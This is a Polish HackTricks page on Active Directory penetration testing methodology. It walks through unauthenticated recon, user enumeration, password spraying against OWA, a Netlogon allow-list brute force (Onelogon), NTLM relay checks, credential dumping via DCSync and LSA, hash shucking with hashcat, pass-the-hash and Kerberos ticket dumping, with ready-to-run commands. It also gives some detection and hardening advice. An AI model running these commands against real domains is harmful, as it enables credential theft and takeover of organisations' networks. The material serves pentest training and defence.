# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** jest podstawową technologią umożliwiającą **administratorom sieci** sprawne tworzenie i zarządzanie **domenami**, **użytkownikami** oraz **obiektami** w sieci. Została zaprojektowana z myślą o skalowaniu, ułatwiając organizowanie dużej liczby użytkowników w możliwe do zarządzania **grupy** i **podgrupy**, a także kontrolowanie **uprawnień dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domen**, **drzew** i **lasów**. **Domena** obejmuje zbiór obiektów, takich jak **użytkownicy** lub **urządzenia**, korzystających ze wspólnej bazy danych. **Drzewa** to grupy takich domen połączonych wspólną strukturą, a **las** reprezentuje zbiór wielu drzew połączonych za pomocą **relacji zaufania**, tworząc najwyższą warstwę struktury organizacyjnej. Na każdym z tych poziomów można określać konkretne **uprawnienia dostępu** i **komunikacji**.

Najważniejsze pojęcia związane z **Active Directory** obejmują:

1. **Katalog** – Przechowuje wszystkie informacje dotyczące obiektów Active Directory.
2. **Obiekt** – Oznacza jednostki znajdujące się w katalogu, w tym **użytkowników**, **grupy** lub **foldery współdzielone**.
3. **Domena** – Służy jako kontener dla obiektów katalogu. W obrębie **lasu** może współistnieć wiele domen, z których każda przechowuje własny zbiór obiektów.
4. **Drzewo** – Grupa domen współdzielących wspólną domenę główną.
5. **Las** – Najwyższy poziom struktury organizacyjnej w Active Directory, składający się z kilku drzew połączonych **relacjami zaufania**.

**Active Directory Domain Services (AD DS)** obejmuje szereg usług kluczowych dla scentralizowanego zarządzania siecią i komunikacji w jej obrębie. Usługi te obejmują:

1. **Domain Services** – Centralizuje przechowywanie danych i zarządza interakcjami między **użytkownikami** a **domenami**, w tym funkcjami **uwierzytelniania** i **wyszukiwania**.
2. **Certificate Services** – Nadzoruje tworzenie, dystrybucję i zarządzanie bezpiecznymi **certyfikatami cyfrowymi**.
3. **Lightweight Directory Services** – Obsługuje aplikacje korzystające z katalogu za pomocą **protokołu LDAP**.
4. **Directory Federation Services** – Zapewnia funkcje **single sign-on**, umożliwiając uwierzytelnianie użytkowników w wielu aplikacjach webowych w ramach jednej sesji.
5. **Rights Management** – Pomaga chronić materiały objęte prawem autorskim poprzez regulowanie ich nieautoryzowanej dystrybucji i użycia.
6. **DNS Service** – Ma kluczowe znaczenie dla rozwiązywania **nazw domen**.

Bardziej szczegółowe wyjaśnienie znajdziesz tutaj: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Uwierzytelnianie Kerberos**

Aby nauczyć się, jak **atakować AD**, musisz naprawdę dobrze **zrozumieć proces uwierzytelniania Kerberos**.\
[**Przeczytaj tę stronę, jeśli nadal nie wiesz, jak to działa.**](kerberos-authentication.md)

## Cheat Sheet

Na stronie [https://wadcoms.github.io/](https://wadcoms.github.io) znajdziesz szybki przegląd poleceń, które możesz uruchomić w celu enumeracji/exploitowania AD.

> [!WARNING]
> Komunikacja Kerberos zwykle **wymaga w pełni kwalifikowanej nazwy domeny (FQDN)**, aby klient mógł uzyskać ticket dla właściwego SPN. Uzyskiwanie dostępu do maszyny za pomocą adresu IP często powoduje przejście na NTLM zamiast Kerberos.

## Recon Active Directory (bez creds/sesji)

Jeśli masz dostęp do środowiska AD, ale nie masz żadnych credentials/sesji, możesz:

- **Wykonać pentest sieci:**
- Przeskanować sieć, znaleźć maszyny i otwarte porty oraz spróbować **exploitować luki** lub **wyciągnąć credentials** z tych maszyn (na przykład [drukarki mogą być bardzo interesującymi celami](ad-information-in-printers.md)).
- Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak serwery webowe, drukarki, udziały, vpn, media itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Zajrzyj do ogólnej [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md), aby uzyskać więcej informacji na temat wykonania tego zadania.
- **Sprawdź dostęp null i Guest w usługach smb** (nie zadziała to w nowoczesnych wersjach Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bardziej szczegółowy przewodnik dotyczący enumeracji serwera SMB znajdziesz tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumeruj LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Bardziej szczegółowy przewodnik dotyczący enumeracji LDAP znajdziesz tutaj (zwróć **szczególną uwagę na dostęp anonimowy**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Zatruj sieć**
- Zbieraj credentials, [**podszywając się pod usługi za pomocą Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Uzyskaj dostęp do hosta, [**nadużywając relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Zbieraj credentials, **udostępniając** [**fałszywe usługi UPnP za pomocą evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Wyodrębnij nazwy użytkowników/imiona i nazwiska z wewnętrznych dokumentów, mediów społecznościowych oraz usług (głównie webowych) znajdujących się w środowiskach domenowych, a także z publicznie dostępnych źródeł.
- Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz wypróbować różne **konwencje nazw użytkowników AD (**[**przeczytaj to**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najczęściej spotykane konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (3 litery każdego członu), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _losowe litery i 3 losowe cyfry_ (abc123).
- Narzędzia:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracja użytkowników

- **Anonimowa enumeracja SMB/LDAP:** Sprawdź strony [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeracja Kerbrute**: Gdy zostanie wysłana prośba dotycząca **nieprawidłowej nazwy użytkownika**, serwer odpowie za pomocą kodu błędu **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala ustalić, że nazwa użytkownika jest nieprawidłowa. W przypadku **prawidłowych nazw użytkowników** otrzymana zostanie odpowiedź zawierająca **TGT w AS-REP** albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi wykonać pre-authentication.
- **Brak uwierzytelniania względem MS-NRPC**: Użycie auth-level = 1 (No authentication) względem interfejsu MS-NRPC (Netlogon) na kontrolerach domeny. Metoda wywołuje funkcję `DsrGetDcNameEx2` po zbindowaniu interfejsu MS-NRPC, aby sprawdzić, czy użytkownik lub komputer istnieje, bez używania credentials. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje ten typ enumeracji. Opis badań można znaleźć [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Serwer OWA (Outlook Web Access)**

Jeśli znaleziono jeden z tych serwerów w sieci, można również przeprowadzić **enumerację użytkowników na jego podstawie**. Można na przykład użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Listy nazw użytkowników można znaleźć w [**tym repozytorium github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) oraz w tym repozytorium ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jednak z etapu recon, który powinien zostać wykonany wcześniej, powinieneś mieć **nazwiska osób pracujących w firmie**. Mając imię i nazwisko, możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) do wygenerowania potencjalnie poprawnych nazw użytkowników.

### Abuse of the Netlogon vulnerable-channel allow-list (Onelogon)

Nawet po załataniu **Zerologon** na DC konta jawnie umieszczone na allow-liście mogą nadal być narażone na **legacy/vulnerable Netlogon secure-channel behavior**. Ryzykowną konfiguracją jest GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** lub odpowiadająca mu wartość rejestru **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta wartość jest **deskryptorem zabezpieczeń SDDL** (zobacz [Security Descriptors](security-descriptors.md)). Każde konto lub grupa, której przyznano odpowiedni ACE w DACL, może być celem ataku. Na przykład `O:BAG:BAD:(A;;RC;;;WD)` skutecznie umieszcza **Everyone** na allow-liście.

Praktyczny workflow operatora:

1. **Zidentyfikuj principalów znajdujących się na allow-liście**, sprawdzając zarówno **SYSVOL/GPO**, jak i **aktywny rejestr DC**.
2. **Rozwiąż identyfikatory SID** znalezione w SDDL do rzeczywistych użytkowników/komputerów AD i nadaj priorytet **kontom komputerów DC**, **kontom trustów** oraz innym uprzywilejowanym komputerom.
3. Wielokrotnie próbuj **uwierzytelniania MS-NRPC / Netlogon** jako konto znajdujące się na allow-liście.
4. Po pomyślnym odgadnięciu hasła wykorzystaj **ustawianie hasła Netlogon**, aby zresetować hasło konta docelowego (publiczny PoC ustawia je na pusty ciąg).<sup>[[9]](#references)[[10]](#references)</sup>

Szybkie przykłady triage / lab z publicznego artefaktu:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Uwagi:

- **scanner** jest przydatny, ponieważ skuteczna allow-list może znajdować się w **SYSVOL**, w **registry** albo w obu tych miejscach.
- Sama ścieżka exploita jest istotna, ponieważ po zidentyfikowaniu podatnego konta **nie wymaga uprawnień Domain Admin**.
- Przejęcie **konta komputera Domain Controller**, takiego jak `DC$`, jest szczególnie niebezpieczne, ponieważ zresetowanie tego hasła może bezpośrednio umożliwić szersze ścieżki **przejęcia AD**.
- Wykonalność **brute-force** zależy od trybu: publicznie opisany artefakt przedstawia podejście meet-in-the-middle, **24-bitowy** brute force, gdy dostępne jest inne konto komputera, oraz wolniejsze warianty **32-bitowe**.

Uwagi dotyczące wykrywania / hardeningu:

- Przeprowadź audyt polityki allow-list i usuń wszystko poza tymczasowymi, wyraźnie wymaganymi wyjątkami kompatybilności.
- Monitoruj zdarzenia **System** na DC: **5827/5828/5829/5830/5831**, aby wykrywać odrzucane, wykryte lub jawnie dozwolone przez politykę podatne połączenia Netlogon.
- Traktuj konta znajdujące się w `VulnerableChannelAllowList` jako **wysokiego ryzyka**, dopóki zależność od starszego rozwiązania nie zostanie usunięta.

### Znając jedną lub kilka nazw użytkowników

Jeśli wiesz już, że masz prawidłową nazwę użytkownika, ale nie znasz żadnych haseł, spróbuj:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_, możesz **zażądać komunikatu AS_REP** dla tego użytkownika, który będzie zawierał dane zaszyfrowane za pomocą pochodnej hasła użytkownika.
- [**Password Spraying**](password-spraying.md): Spróbujmy **najczęstszych haseł** dla każdego z odkrytych użytkowników — być może któryś z nich używa słabego hasła (pamiętaj o polityce haseł!).
- Pamiętaj, że możesz również przeprowadzić **spraying na serwerach OWA**, aby spróbować uzyskać dostęp do serwerów pocztowych użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Możesz być w stanie **uzyskać** pewne **hashe** challenge, przeprowadzając **poisoning** niektórych protokołów **sieci**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Enumeration w Active Directory dostarcza informacji o potencjalnych kontach, hostach i usługach, które można skłonić do uwierzytelnienia. Wykorzystaj ten kontekst, aby zidentyfikować możliwe [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM oraz potencjalne ścieżki do środowiska AD.

### Recon i sprawdzanie konfiguracji relay w NetExec na podstawie workspace

- Używaj **workspace `nxcdb`**, aby zachowywać stan recon w AD osobno dla każdego engagementu: `workspace create <name>` tworzy bazy SQLite dla poszczególnych protokołów w `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Przełączaj widoki za pomocą `proto smb|mssql|winrm` i wyświetlaj zebrane sekrety za pomocą `creds`. Po zakończeniu ręcznie usuń wrażliwe dane: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Szybkie wykrywanie podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domenę**, **build systemu operacyjnego**, **wymagania dotyczące podpisywania SMB** oraz **Null Auth**. Hosty członkowskie pokazujące `(signing:False)` są **podatne na relay**, podczas gdy DC często wymagają podpisywania.
- Generuj **nazwy hostów w /etc/hosts** bezpośrednio z outputu NetExec, aby ułatwić targetowanie:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Gdy **SMB relay do DC jest blokowany** przez signing, nadal sprawdź stan **LDAP**: `netexec ldap <dc>` wskazuje `(signing:None)` / słabe channel binding. DC z wymaganym SMB signingiem, ale wyłączonym LDAP signingiem, nadal jest podatnym celem dla **relay-to-LDAP** i nadużyć takich jak **SPN-less RBCD**.

### Wyciek poświadczeń z drukarek po stronie klienta → masowa walidacja poświadczeń domenowych

- Interfejsy drukarek/webowe UI czasami **osadzają zamaskowane hasła administratora w HTML**. Wyświetlenie źródła/devtools może ujawnić hasło w cleartext (np. `<input value="<password>">`), umożliwiając dostęp z użyciem Basic-auth do repozytoriów skanów/wydruków.
- Pobrane zadania drukowania mogą zawierać **dokumenty onboardingowe w plaintext** z hasłami poszczególnych użytkowników. Podczas testów zachowaj właściwe powiązania:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Kradzież poświadczeń NTLM

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów** przy użyciu **użytkownika null lub guest**, możesz **umieścić pliki** (takie jak plik SCF), które po uzyskaniu do nich dostępu **wyzwolą uwierzytelnianie NTLM przeciwko Tobie**, dzięki czemu będziesz mógł **ukraść** **challenge NTLM** i poddać go łamaniu:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking i ataki NT-Candidate

**Hash shucking** traktuje każdy posiadany już hash NT jako hasło-kandydata dla innych, wolniejszych formatów, których materiał kluczowy jest bezpośrednio wyprowadzany z hasha NT. Zamiast brute-force'ować długie passphrase w biletach Kerberos RC4, challenge'ach NetNTLM lub cached credentials, przekazujesz hashe NT do trybów NT-candidate Hashcat i pozwalasz mu zweryfikować ponowne użycie hasła bez poznawania plaintextu. Jest to szczególnie skuteczne po przejęciu domeny, gdy możesz zebrać tysiące bieżących i historycznych hashy NT.<sup>[[5]](#references)</sup>

Użyj shucking, gdy:

- Masz zbiór NT z DCSync, zrzutów SAM/SECURITY lub credential vaults i chcesz sprawdzić ponowne użycie w innych domenach/lasach.
- Przechwytujesz materiał Kerberos oparty na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), odpowiedzi NetNTLM lub bloby DCC/DCC2.
- Chcesz szybko potwierdzić ponowne użycie długich, niemożliwych do złamania passphrase i natychmiast wykonać pivot przez Pass-the-Hash.

Technika ta **nie działa** przeciwko typom szyfrowania, których klucze nie są hashem NT (np. Kerberos etype 17/18 AES). Jeśli domena wymusza tylko AES, musisz powrócić do standardowych trybów haseł.

#### Tworzenie zbioru hashy NT

- **DCSync/NTDS** – Użyj `secretsdump.py` z historią, aby pobrać możliwie największy zbiór hashy NT (wraz z ich poprzednimi wartościami):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Wpisy historii znacznie zwiększają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy dla każdego konta. Więcej sposobów na pozyskiwanie sekretów NTDS znajdziesz tutaj:

{{#ref}}
dcsync.md
{{#endref}}

- **Zrzuty cache endpointów** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) wyodrębnia lokalne dane SAM/SECURITY oraz cached domain logons (DCC/DCC2). Usuń duplikaty i dodaj te hashe do tej samej listy `nt_candidates.txt`.
- **Śledź metadane** – Zachowaj nazwę użytkownika/domeny, z której pochodzi każdy hash (nawet jeśli wordlist zawiera tylko wartości szesnastkowe). Dopasowane hashe natychmiast pokażą, który principal ponownie używa hasła, gdy Hashcat wyświetli pasującego kandydata.
- Preferuj kandydatów z tego samego lasu lub z zaufanego lasu; maksymalizuje to szansę na nakładanie się wartości podczas shucking.

#### Tryby NT-candidate Hashcat

| Typ hasha                                | Tryb hasła | Tryb NT-candidate |
| ---------------------------------------- | ---------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100       | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100       | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500       | 27000             |
| NetNTLMv2                                | 5600       | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500       | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100      | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200      | 35400             |

Uwagi:

- Dane wejściowe NT-candidate **muszą pozostać surowymi hashami NT o długości 32 znaków szesnastkowych**. Wyłącz silniki reguł (bez `-r` i bez trybów hybrydowych), ponieważ modyfikowanie danych uszkadza materiał klucza kandydata.
- Tryby te nie są z natury szybsze, ale przestrzeń kluczy NTLM (~30 000 MH/s na M3 Max) jest około 100 razy szybsza niż Kerberos RC4 (~300 MH/s). Testowanie wyselekcjonowanej listy NT jest znacznie tańsze niż przeszukiwanie całej przestrzeni haseł w wolnym formacie.
- Zawsze uruchamiaj **najnowszą wersję Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), ponieważ tryby 31500/31600/35300/35400 zostały dodane niedawno.<sup>[[7]](#references)</sup>
- Obecnie nie istnieje tryb NT dla AS-REQ Pre-Auth, a etypes AES (19600/19700) wymagają plaintextu hasła, ponieważ ich klucze są wyprowadzane przez PBKDF2 z haseł UTF-16LE, a nie z surowych hashy NT.

#### Przykład – Kerberoast RC4 (tryb 35300)

1. Przechwyć bilet RC4 TGS dla docelowego SPN za pomocą użytkownika o niskich uprawnieniach (szczegóły znajdziesz na stronie Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Wykonaj shucking biletu za pomocą listy NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat wyprowadza klucz RC4 z każdego kandydata NT i weryfikuje blob `$krb5tgs$23$...`. Dopasowanie potwierdza, że konto usługi używa jednego z posiadanych już hashy NT.

3. Natychmiast wykonaj pivot przez PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcjonalnie możesz później odzyskać plaintext za pomocą `hashcat -m 1000 <matched_hash> wordlists/`, jeśli będzie potrzebny.

#### Przykład – Cached credentials (tryb 31600)

1. Zrzuć cached logons z przejętej stacji roboczej:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Skopiuj wiersz DCC2 dotyczący interesującego użytkownika domeny do `dcc2_highpriv.txt` i wykonaj shucking:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Pomyślne dopasowanie zwraca hash NT już znany na Twojej liście, potwierdzając, że cached user ponownie używa hasła. Użyj go bezpośrednio do PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) albo poddaj go brute-force w szybkim trybie NTLM, aby odzyskać tekst hasła.

Dokładnie ten sam workflow dotyczy challenge-response NetNTLM (`-m 27000/27100`) oraz DCC (`-m 31500`). Po zidentyfikowaniu dopasowania możesz uruchomić relay, SMB/WMI/WinRM PtH albo ponownie łamać hash NT za pomocą masek/reguł offline.



## Enumerowanie Active Directory Z credentials/session

W tej fazie musisz mieć **przejęte credentials lub session prawidłowego konta domenowego**. Jeśli masz prawidłowe credentials albo shell jako użytkownik domeny, **pamiętaj, że wcześniej przedstawione opcje nadal umożliwiają przejęcie innych użytkowników**.

Przed rozpoczęciem authenticated enumeration zapoznaj się z **problemem podwójnego przeskoku Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeracja

Przejęcie konta to **ważny krok w kierunku oceny domeny**, ponieważ umożliwia uwierzytelnioną **enumerację Active Directory**:

W przypadku [**ASREPRoast**](asreproast.md) możesz teraz znaleźć każdego potencjalnie podatnego użytkownika, a w przypadku [**Password Spraying**](password-spraying.md) możesz uzyskać **listę wszystkich nazw użytkowników** i wypróbować hasło przejętego konta, puste hasła oraz nowe obiecujące hasła.

- Możesz użyć [**CMD do wykonania podstawowego recon**](../basic-cmd-for-pentesters.md#domain-info)
- Możesz także użyć [**powershell do recon**](../basic-powershell-for-pentesters/index.html), co będzie bardziej stealthy
- Możesz również [**użyć powerview**](../basic-powershell-for-pentesters/powerview.md) do wyodrębnienia bardziej szczegółowych informacji
- Kolejnym świetnym narzędziem do recon w Active Directory jest [**BloodHound**](bloodhound.md). Jest **niezbyt stealthy** (zależnie od używanych metod kolekcji), ale **jeśli Ci to nie przeszkadza**, zdecydowanie warto go wypróbować. Znajdź, gdzie użytkownicy mogą korzystać z RDP, ścieżkę do innych grup itd.
- **Inne zautomatyzowane narzędzia do enumeracji AD to:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Rekordy DNS Active Directory**](ad-dns-records.md), ponieważ mogą zawierać interesujące informacje.
- **Narzędziem z GUI**, którego możesz użyć do enumeracji katalogu, jest **AdExplorer.exe** z pakietu **SysInternal** Suite.
- Możesz także przeszukiwać bazę LDAP za pomocą **ldapsearch**, aby szukać credentials w polach _userPassword_ i _unixUserPassword_, a nawet w polu _Description_. Zobacz [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment), aby poznać inne metody.
- Jeśli używasz **Linux**, możesz również enumerować domenę za pomocą [**pywerview**](https://github.com/the-useless-one/pywerview).
- Możesz także wypróbować zautomatyzowane narzędzia, takie jak:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Wyodrębnianie wszystkich użytkowników domeny**

Uzyskanie wszystkich nazw użytkowników domeny z Windows jest bardzo łatwe (`net user /domain`, `Get-DomainUser` lub `wmic useraccount get name,sid`). W Linux możesz użyć: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` lub `enum4linux -a -u "user" -p "password" <DC IP>`

> Nawet jeśli ta sekcja Enumeracja wydaje się krótka, jest najważniejszą częścią całości. Otwórz linki (głównie te dotyczące cmd, powershell, powerview i BloodHound), naucz się enumerować domenę i ćwicz, aż poczujesz się swobodnie. Podczas assessment będzie to kluczowy moment pozwalający znaleźć drogę do DA albo zdecydować, że nic nie da się zrobić.

### Kerberoast

Kerberoasting polega na uzyskaniu **biletów TGS** używanych przez usługi powiązane z kontami użytkowników i złamaniu ich szyfrowania — które opiera się na hasłach użytkowników — **offline**.

Więcej informacji znajdziesz tutaj:


{{#ref}}
kerberoast.md
{{#endref}}

### Połączenie zdalne (RDP, SSH, FTP, Win-RM itd.)

Po uzyskaniu credentials możesz sprawdzić, czy masz dostęp do jakiejś **maszyny**. W tym celu możesz użyć **CrackMapExec**, aby spróbować połączyć się z kilkoma serwerami za pomocą różnych protokołów, zgodnie z wynikami skanowania portów.

### Local Privilege Escalation

Jeśli przejąłeś credentials lub session zwykłego użytkownika domeny i możesz uzyskać dostęp do **dowolnej maszyny w domenie**, poszukaj ścieżki do **lokalnego podniesienia uprawnień i zebrania credentials**. Uprawnienia lokalnego administratora mogą pozwolić Ci na **zrzucenie hashy innych użytkowników** z pamięci (LSASS) i lokalnego magazynu (SAM).

W tej książce znajduje się kompletna strona poświęcona [**local privilege escalation w Windows**](../windows-local-privilege-escalation/index.html) oraz [**checklista**](../checklist-windows-privilege-escalation.md). Nie zapomnij także użyć [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Bieżące tickety session

Jest **bardzo mało prawdopodobne**, że znajdziesz w bieżącym użytkowniku **tickety dające Ci uprawnienia do uzyskania dostępu** do nieoczekiwanych zasobów, ale możesz to sprawdzić:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Mając poświadczenia domenowe lub sesję użytkownika, ponownie przeanalizuj [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): techniki uwierzytelnionego enumeration i coercion mogą ujawnić ścieżki relay, które były niedostępne podczas nieuwierzytelnionego rozpoznania.

### Wyszukiwanie Creds w udziałach komputerów | udziałach SMB

Teraz, gdy masz już podstawowe poświadczenia, sprawdź, czy możesz **znaleźć** jakieś **interesujące pliki udostępniane wewnątrz AD**. Możesz zrobić to ręcznie, ale jest to bardzo nudne i powtarzalne zadanie (zwłaszcza jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Kliknij ten link, aby dowiedzieć się więcej o narzędziach, których możesz użyć.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Kradzież Creds NTLM

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów**, możesz **umieścić pliki** (np. plik SCF), które po uzyskaniu do nich dostępu **wyzwolą uwierzytelnianie NTLM przeciwko Tobie**, dzięki czemu będziesz mógł **ukraść** **challenge NTLM**, aby go złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta podatność umożliwiała każdemu uwierzytelnionemu użytkownikowi **przejęcie kontrolera domeny**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacja uprawnień w Active Directory Z uprzywilejowanymi poświadczeniami/sesją

**W przypadku poniższych technik zwykły użytkownik domeny nie wystarczy — do przeprowadzenia tych ataków potrzebujesz specjalnych uprawnień/poświadczeń.**

### Ekstrakcja hashy

Miejmy nadzieję, że udało Ci się **przejąć** jakieś konto **lokalnego administratora** za pomocą [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), w tym relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) lub [lokalnej eskalacji uprawnień](../windows-local-privilege-escalation/index.html).\
